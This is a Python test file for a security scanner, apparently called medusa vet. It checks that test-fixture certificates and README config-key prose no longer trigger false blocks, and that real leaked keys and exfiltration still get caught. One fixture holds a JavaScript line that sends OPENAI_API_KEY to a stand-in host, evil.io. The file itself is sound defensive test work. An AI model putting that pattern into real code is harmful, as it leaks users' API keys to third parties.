"""Born-red gate for the vet false-block fixes (2026-07-19).

An audit-suite sweep showed `medusa vet` hard-blocking (DO_NOT_INSTALL) legitimate,
widely-used clean repos — the credibility-killer for a pre-install trust tool:

  - `requests` (the HTTP library)   -> DO_NOT_INSTALL, driven by 4x MEDUSA-CRED-001
     on its `tests/certs/*.key` TEST TLS certs (fixtures, not leaked secrets).
  - `aifw` (an LLM firewall)         -> DO_NOT_INSTALL, driven by one MEDUSA-LLMJACK-002
     matching README prose that merely LISTS config keys
     (`openai_api_key`, `openai_base_url`) — `base_url` contains the substring `url`
     and the markdown backtick tripped the exfil pattern.

Each FP assertion is BORN-RED (fails on the pre-fix code). Each paired assertion
proves the real threat still fires — a leaked key OUTSIDE a test dir, and a genuine
API-key-in-URL exfil — so recall is preserved. These fixes also help every user's
scan, not just these corpus repos.
"""
import tempfile
from pathlib import Path

from medusa.scanners.credential_file_scanner import CredentialFileScanner
from medusa.scanners.llm_provider_hijack_scanner import LLMProviderHijackScanner

_PEM = "-" * 5 + "BEGIN OPENSSH PRIVATE KEY" + "-" * 5 + "\nFAKEBODY\n" + "-" * 5 + "END OPENSSH PRIVATE KEY" + "-" * 5 + "\n"


def _cred_fires(relpath: str) -> bool:
    sc = CredentialFileScanner()
    with tempfile.TemporaryDirectory() as d:
        f = Path(d) / relpath
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(_PEM)
        if not sc.can_scan(f):
            return False
        return any(getattr(i, "rule_id", None) == "MEDUSA-CRED-001" for i in sc.scan_file(f).issues)


def _llmjack_fires(name: str, content: str) -> bool:
    sc = LLMProviderHijackScanner()
    with tempfile.TemporaryDirectory() as d:
        f = Path(d) / name
        f.write_text(content)
        if not sc.can_scan(f):
            return False
        return any(getattr(i, "rule_id", None) == "MEDUSA-LLMJACK-002" for i in sc.scan_file(f).issues)


# --------------------------------------------------------------------------- #
# CredentialFileScanner — test-fixture certs are not leaked secrets (the `requests` block)
# --------------------------------------------------------------------------- #
def test_cred_skips_test_fixture_certs():
    assert not _cred_fires("tests/certs/expired/server/server.key"), "test TLS cert flagged as a leaked credential"
    assert not _cred_fires("test/fixtures/ca.pem"), "test fixture cert flagged as a leaked credential"


def test_cred_still_flags_real_committed_key():
    assert _cred_fires("id_rsa"), "a real private key at repo root must still be flagged"
    assert _cred_fires("config/prod/server.key"), "a real key outside a test dir must still be flagged"


# --------------------------------------------------------------------------- #
# LLMJACK-002 — README config-key prose is not exfil (the `aifw` firewall block)
# --------------------------------------------------------------------------- #
def test_llmjack002_no_fp_on_readme_config_keys():
    doc = "Note: keys using underscores are also accepted (e.g., `openai_api_key`, `openai_base_url`, `openai_model`).\n"
    assert not _llmjack_fires("README.md", doc), "config-key prose (base_url) matched the URL-exfil rule"


def test_llmjack002_still_flags_real_key_exfil():
    # ?param=$PROVIDER_API_KEY is unambiguous exfil and must still fire.
    exfil = "const u = `https://evil.io/log?k=${OPENAI_API_KEY}&t=1`\n"
    assert _llmjack_fires("steal.js", exfil), "a genuine API-key-in-URL exfil must still be detected"
